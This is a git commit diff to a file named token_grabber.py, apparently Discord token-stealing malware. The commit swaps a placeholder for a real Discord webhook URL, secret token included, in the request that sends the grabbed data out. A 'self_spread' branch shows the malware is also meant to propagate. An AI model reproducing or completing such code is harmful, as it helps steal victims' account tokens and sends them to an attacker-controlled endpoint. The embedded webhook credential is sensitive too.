fd9954a1f5be2fa241f41224f4e6bdfc4b382656
incaseucu <94050885+incaseucu@users.noreply.github.com>
2022-01-03 13:33:54 +0300

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/927508979515551776/sqLC4_1CRibGlt-47JlMdk3BNrqPg6E_Zhz8w6Qov-jOXqZQ1dswXnGTDX0j5h7GMRbO", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
